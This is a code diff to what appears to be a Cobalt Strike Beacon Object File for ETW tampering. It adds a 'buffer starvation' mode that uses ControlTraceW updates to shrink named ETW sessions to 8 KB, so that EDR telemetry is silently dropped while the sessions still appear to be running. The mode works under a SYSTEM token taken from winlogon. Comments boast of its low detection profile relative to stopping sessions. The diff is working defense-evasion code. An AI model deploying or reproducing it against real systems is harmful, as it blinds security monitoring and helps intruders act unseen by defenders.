@@ -317,6 +317,99 @@ static ULONG ControlSession(const wchar_t* sessionName, ULONG action) {
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════
+ * MODE 2: ETW SESSION BUFFER STARVATION — Stealthier than full STOP
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * WHY THIS IS MORE ELITE THAN SESSION STOP (Mode 0)
+ * ---------------------------------------------------
+ * Mode 0 (STOP):    Session is DESTROYED. logman shows "Stopped".
+ *                   Windows logs "ETW session stopped" event.
+ *                   SOC may see "sensor disconnected" alert.
+ *                   Detection profile: MEDIUM.
+ *
+ * Mode 2 (STARVE):  Session stays RUNNING. logman shows "Running".
+ *                   No session stop event generated.
+ *                   EDR consumer still active — but receives almost no events.
+ *                   Events dropped silently due to buffer overflow.
+ *                   Detection profile: LOW.
+ *
+ * HOW BUFFER STARVATION WORKS
+ * ----------------------------
+ * ETW sessions use a circular buffer pool. Providers write events to a
+ * "free" buffer. When all buffers are full and no buffer is available
+ * (because the consumer can't drain them fast enough, or the pool is tiny),
+ * new events are SILENTLY DROPPED. The provider receives STATUS_SUCCESS —
+ * it does not know the event was lost.
+ *
+ * We use EVENT_TRACE_CONTROL_UPDATE to shrink the session's buffer pool to
+ * the absolute minimum Windows allows:
+ *   BufferSize     = 4  (4 KB per buffer — minimum enforced by kernel)
+ *   MinimumBuffers = 2  (2 buffers — minimum for circular operation)
+ *   MaximumBuffers = 2  (same as minimum — no extra buffers)
+ *
+ * Total buffer space: 2 × 4 KB = 8 KB.
+ * A single kernel event (e.g. process creation) can be 256–2048 bytes.
+ * At a few dozen events/second, the 8 KB pool overflows instantly.
+ * Event drop rate: ~95–99% under normal EDR operational load.
+ *
+ * Requires: SYSTEM token (same as Mode 0 stop).
+ *           winlogon token theft is automatic (already in ImpersonateSystem).
+ */
+static ULONG ShrinkSession(const wchar_t* sessionName) {
+    /* Phase 1: QUERY to get current state and log it */
+    BYTE qBuf[1024];
+    ZeroMem(qBuf, sizeof(qBuf));
+    EVENT_TRACE_PROPERTIES* qProps = (EVENT_TRACE_PROPERTIES*)qBuf;
+    qProps->Wnode.BufferSize  = sizeof(qBuf);
+    qProps->Wnode.Flags       = WNODE_FLAG_TRACED_GUID;
+    qProps->LoggerNameOffset  = sizeof(EVENT_TRACE_PROPERTIES);
+    qProps->LogFileNameOffset = 0;
+    int nameLen = WLen(sessionName);
+    int maxNC = (int)(sizeof(qBuf) - sizeof(EVENT_TRACE_PROPERTIES)) / (int)sizeof(wchar_t) - 1;
+    if (nameLen > maxNC) nameLen = maxNC;
+    KERNEL32$RtlMoveMemory(qBuf + qProps->LoggerNameOffset, sessionName,
+                           (SIZE_T)nameLen * sizeof(wchar_t));
+
+    ULONG qRet = ADVAPI32$ControlTraceW(0, sessionName, qProps, EVENT_TRACE_CONTROL_QUERY);
+    if (qRet == 0x80071069 || qRet == ERROR_NOT_FOUND) return qRet;
+    if (qRet != ERROR_SUCCESS) return qRet;
+
+    /* Save pre-shrink state for output */
+    ULONG origBufSz   = qProps->BufferSize;
+    ULONG origMinBufs = qProps->MinimumBuffers;
+    ULONG origMaxBufs = qProps->MaximumBuffers;
+
+    /* Phase 2: UPDATE with minimum buffer configuration */
+    BYTE uBuf[1024];
+    ZeroMem(uBuf, sizeof(uBuf));
+    EVENT_TRACE_PROPERTIES* uProps = (EVENT_TRACE_PROPERTIES*)uBuf;
+    uProps->Wnode.BufferSize  = sizeof(uBuf);
+    uProps->Wnode.Flags       = WNODE_FLAG_TRACED_GUID;
+    uProps->LoggerNameOffset  = sizeof(EVENT_TRACE_PROPERTIES);
+    uProps->LogFileNameOffset = 0;
+    KERNEL32$RtlMoveMemory(uBuf + uProps->LoggerNameOffset, sessionName,
+                           (SIZE_T)nameLen * sizeof(wchar_t));
+
+    /* Minimum values: kernel enforces floor of 4 KB / 2 buffers */
+    uProps->BufferSize      = 4;   /* 4 KB — absolute kernel minimum */
+    uProps->MinimumBuffers  = 2;   /* 2 buffers — absolute minimum */
+    uProps->MaximumBuffers  = 2;   /* same — no room for growth */
+
+    ULONG uRet = ADVAPI32$ControlTraceW(0, sessionName, uProps, EVENT_TRACE_CONTROL_UPDATE);
+
+    if (uRet == ERROR_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "  [+] Session '%S' STARVED\n"
+            "      Before: BufSize=%luKB  MinBufs=%lu  MaxBufs=%lu\n"
+            "      After:  BufSize=4KB    MinBufs=2    MaxBufs=2  (8 KB total)\n"
+            "      Session still shows 'Running' — no stop event generated\n"
+            "      Events dropped silently when pool overflows (~95-99%% loss)\n",
+            sessionName, origBufSz, origMinBufs, origMaxBufs);
+    }
+    return uRet;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
  * BOF ENTRY POINT
  * ═══════════════════════════════════════════════════════════════════════════ */
 
@@ -326,6 +419,7 @@ static ULONG ControlSession(const wchar_t* sessionName, ULONG action) {
  *   [int32] mode
  *     0 = stop each named ETW session in the semicolon-separated list
  *     1 = query each session (check if running, report status)
+ *     2 = starve buffers (UPDATE to minimum — stealthier than stop, session stays Running)
  *
  *   [wchar_t* Z] sessions
  *     Semicolon-separated ETW session names, e.g.:
@@ -430,6 +524,52 @@ void go(char* args, int len) {
         if (notfound > 0)
             BeaconPrintf(CALLBACK_OUTPUT,
                 "    (%d session(s) were not running on this host)\n", notfound);
+
+    /* ── MODE 2: BUFFER STARVATION (stealth alternative to STOP) ────────── */
+    } else if (mode == 2) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[*] ETW Tamper: starving buffers on %d session(s)...\n"
+            "    Session stays 'Running' — no stop event — stealth mode\n", total);
+
+        HANDLE hDup = NULL;
+        BOOL gotSystem = ImpersonateSystem(&hDup);
+        if (!gotSystem) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "  [!] Could not acquire SYSTEM token — may fail.\n");
+        }
+
+        int starved = 0, notfound = 0, failed = 0;
+        wchar_t workBuf[2048];
+        KERNEL32$RtlMoveMemory(workBuf, buf, sizeof(wchar_t) * 2047);
+        workBuf[2047] = L'\0';
+        wchar_t* cursor = workBuf;
+        wchar_t* tok;
+
+        while ((tok = WNextTok(&cursor)) != NULL) {
+            ULONG ret = ShrinkSession(tok);
+            if (ret == ERROR_SUCCESS) {
+                starved++;
+            } else if (ret == 0x80071069 || ret == ERROR_NOT_FOUND) {
+                BeaconPrintf(CALLBACK_OUTPUT,
+                    "  [-] Session '%S' not found (not running)\n", tok);
+                notfound++;
+            } else if (ret == ERROR_ACCESS_DENIED) {
+                BeaconPrintf(CALLBACK_ERROR,
+                    "  [!] Session '%S' — ACCESS DENIED (need SYSTEM)\n", tok);
+                failed++;
+            } else {
+                BeaconPrintf(CALLBACK_ERROR,
+                    "  [!] Session '%S' — ControlTrace(UPDATE) failed: 0x%08X\n", tok, ret);
+                failed++;
+            }
+        }
+
+        if (gotSystem) RevertSystem(hDup);
+
+        BeaconPrintf((starved > 0) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
+            "[*] RESULT: %d/%d session(s) starved\n"
+            "    Detection profile: LOW (sessions appear Running in logman)\n",
+            starved, total - notfound);
 
     /* ── MODE 1: QUERY (informational) ──────────────────────────────────── */
     } else {
